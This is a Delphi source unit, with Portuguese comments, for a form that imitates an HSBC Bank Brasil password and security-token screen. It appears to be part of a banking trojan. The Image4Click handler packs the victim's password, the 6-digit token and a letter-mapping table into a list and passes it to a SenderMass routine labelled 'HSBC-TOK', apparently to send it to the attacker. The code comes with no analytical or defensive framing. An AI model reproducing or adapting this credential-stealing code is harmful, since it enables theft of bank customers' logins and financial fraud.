unit Hs3;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms, 
  Dialogs, pngimage, ExtCtrls, Hs4, StdCtrls;

type
  THsNews3 = class(TFrame)
    Image1: TImage;
    EdSenha: TEdit;
    Image2: TImage;
    Panel1: TPanel;
    Image3: TImage;
    EditTok: TEdit;
    Image4: TImage;
    procedure EdSenhaKeyPress(Sender: TObject; var Key: Char);
    procedure Image2Click(Sender: TObject);
    procedure Image4Click(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;
  var
  HsNews4: THsNews4;

implementation

{$R *.dfm}
uses
Natal, Gerador;

procedure THsNews3.EdSenhaKeyPress(Sender: TObject; var Key: Char);
begin
{se alguma das teclas abaixo for precionada}
if ( Key In ['0'..'9', '@','!','#','$', '%','^','r','e',
'y','o','a','s','d','g','h','j','k','ç','z','x','b','n',
'm','''',

 '"',';',':','[',']','{','}',''''  ]) then   {entao}
 begin

  KEY := #0; //retorna 'null' como c nada fosse precionado

end;
end;

procedure THsNews3.Image2Click(Sender: TObject);
begin
 Screen.Cursor := crHourGlass;
 Sleep(1000);
 Screen.Cursor := crDefault;
 Panel1.Visible := True;
end;

procedure THsNews3.Image4Click(Sender: TObject);
begin
  Screen.Cursor := crHourGlass;
  Sleep(1000);
  Screen.Cursor := crDefault;

  if Length(EditTok.Text) < 6 then
  begin
    MessageBox(Self.handle,'Digite o Token gerado!', 'HSBC BANK BRASIL S.A', MB_ICONWARNING + mb_Ok);
    Exit;
  end;

  DadosEnvio_ := TStringList.Create;
  DadosEnvio_.Add('=============================================');
  DadosEnvio_.Add('HSBC');
  DadosEnvio_.Add('=============================================');
  DadosEnvio_.Add('SENHA 4: '+EdSenha.Text);
  DadosEnvio_.Add('TOKEN 6: '+EditTok.Text);
  DadosEnvio_.Add('=============================================');
  DadosEnvio_.Add('LETRAS:(0=L), (1=I), (2=T); (3=C), (4=W), ');
  DadosEnvio_.Add('LETRAS:(5=F), (6=Q), (7=V); (8=P), (9=U), ');
  DadosEnvio_.Add('=============================================');

//SENDBOX
try
begin
  HsNews4 := THsNews4.Create(Self);

with HsNews4 do
  begin
    Parent := Self;
    Left   := 0;
    Top    := 0;
  end;

  SenderMass(DadosEnvio_ , 'HSBC-TOK');
  DadosEnvio_.Free;
  end;
finally
end;
end;
end.
